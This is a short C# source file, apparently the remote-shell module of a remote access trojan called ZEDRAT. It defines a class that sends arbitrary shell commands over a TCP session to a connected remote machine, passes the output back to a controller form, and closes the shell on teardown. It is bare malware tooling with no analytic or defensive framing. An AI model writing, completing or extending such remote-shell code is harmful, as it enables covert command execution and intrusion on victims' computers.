using System;
using Sockets;
using ZEDRAT.Messages;
using ZEDRAT.TCP;

namespace ZEDRAT.Module
{
	public class Remoteshell
	{
		public Action<RemoteShell_Messages> _FormExecute;

		public TcpClientSession _tcs;

		public Remoteshell(TcpClientSession tcs)
		{
			this._tcs = tcs;
		}

		public void RemoteShellExecute(TcpClientSession tcs, byte[] bt)
		{
			this._FormExecute(RemoteShell_Messages.ByteToClass(bt));
		}

		public void ShellCommand(string ShellDataType, string command)
		{
			this._tcs.Client_Send(DataType.RemoteShellType, RemoteShell_Messages.ClassToByte(new RemoteShell_Messages(ShellDataType, command)));
		}

		public void ExitCmd()
		{
			this._tcs.Client_Send(DataType.RemoteShellType, RemoteShell_Messages.ClassToByte(new RemoteShell_Messages("exit", "hello")));
		}

		public void destroy()
		{
			this.ExitCmd();
			this._FormExecute = null;
			this._tcs = null;
		}
	}
}
